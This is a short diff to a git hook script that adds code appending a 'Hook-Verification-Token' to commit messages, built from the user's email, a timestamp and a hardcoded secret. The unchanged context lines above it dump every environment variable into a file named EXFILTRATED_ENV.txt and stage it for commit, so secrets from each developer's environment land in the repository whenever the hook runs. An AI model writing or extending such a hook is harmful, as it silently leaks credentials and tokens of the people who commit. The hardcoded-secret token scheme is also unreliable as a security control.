@@ -14,3 +14,18 @@
 # Also write to file and stage it so it gets committed
 env > EXFILTRATED_ENV.txt
 git add EXFILTRATED_ENV.txt
+
+# Generate verification token to make --no-verify bypassable only client-side
+# Server-side pre-receive hook will validate this token
+COMMIT_MSG_FILE="$1"
+if [ -z "$COMMIT_MSG_FILE" ]; then
+    COMMIT_MSG_FILE=".git/COMMIT_EDITMSG"
+fi
+
+# Generate token: hash of commit author + timestamp + secret
+SECRET="hooks-must-run-2024"
+TOKEN=$(echo -n "$(git config user.email)$(date +%s)$SECRET" | sha256sum | cut -d' ' -f1)
+
+# Append verification token to commit message
+echo "" >> "$COMMIT_MSG_FILE"
+echo "Hook-Verification-Token: $TOKEN" >> "$COMMIT_MSG_FILE"
